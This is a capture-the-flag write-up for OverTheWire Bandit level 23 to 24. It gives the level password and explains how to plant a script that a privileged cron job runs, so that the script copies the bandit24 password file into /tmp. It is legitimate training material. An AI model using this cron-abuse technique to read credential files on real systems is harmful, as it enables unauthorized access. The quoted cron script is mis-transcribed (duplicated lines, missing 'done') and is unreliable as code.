# LEVEL 23 → 24

>[!Important]
> Username: `bandit23`
>
> Password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

### Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level

`chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)`

### WALKTHROUGH

1. Examining the Cron Job:
Upon logging in, check the cron job files located in /etc/cron.d/. Inside, you’ll find a file named cronjob_bandit24:

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

The `* * * * *` syntax indicates this script runs every minute. It references a script located at `/usr/bin/cronjob_bandit24.sh`, so let’s examine it with:

`cat /usr/bin/cronjob_bandit24.sh`

This script looks like this:

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
    rm -f ./$i
  fi
```
    
2. Understanding the Script: Here’s a breakdown of the important lines:

- `myname=$(whoami)`: Retrieves the current username.
- `cd /var/spool/$myname/foo`: Changes directory to /var/spool/bandit23/foo.
- `for i in * .*`: Iterates over all files, including hidden ones.
- `if [ "$i" != "." -a "$i" != ".." ]`;: Excludes .(current directory) and ..(parent directory)
- `owner="$(stat --format "%U" ./$i)"`: Gets the file owner.
- `if [ "${owner}" = "bandit23" ];`: Runs only if the file owner is bandit23.
- `timeout -s 9 60 ./$i`: Executes the file with a 60-second timeout.
- `rm -f ./$i`: Deletes the file after execution.
  
Knowing this, we can see that files placed in `/var/spool/bandit23/foo` will be executed by the cron job if they are owned by `bandit23`.

3, Preparing Your Script: To capture the flag, we’ll place a script in `/var/spool/bandit23/foo` that outputs the flag to a location we can access.

4. Create a Temporary Directory: First, create a directory in /tmp to store the flag:

`mkdir /tmp/usr0`


> [!Note]
> You can name the directory whatever you like.


5. Writing Your Script: Change into `/var/spool/bandit23/foo` and create a script to capture the flag. Using `nano` or `vim`, write a simple script (e.g., `get.sh`) that directs the flag to your temporary directory:

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/usr0/password.txt
```

This script reads the password file and saves it as `password.txt` in `/tmp/usr0`.

6. Making the Script Executable: Use `chmod` to make the script executable:

`chmod +x get.sh`

> [!Important]
> Since there’s a 60-second limit, your script may be removed before it runs. Keep a copy of the script for easy replacement if needed.

7. Waiting for Execution: After setting the permissions, wait for the cron job to execute your script. After a minute, check `/tmp/usr0` for the `password.txt` file.

![IMAGE](https://github.com/reph0t/CTF/blob/a75f10f8aea5113b853320cf6e49042ee401e8b1/OverTheWire/Bandit/src/Level_23-2.png)


`cat /tmp/usr0/password.txt`

This file should now contain the flag for `bandit24`.

![IMAGE](https://github.com/reph0t/CTF/blob/a75f10f8aea5113b853320cf6e49042ee401e8b1/OverTheWire/Bandit/src/Level_23-3.png)
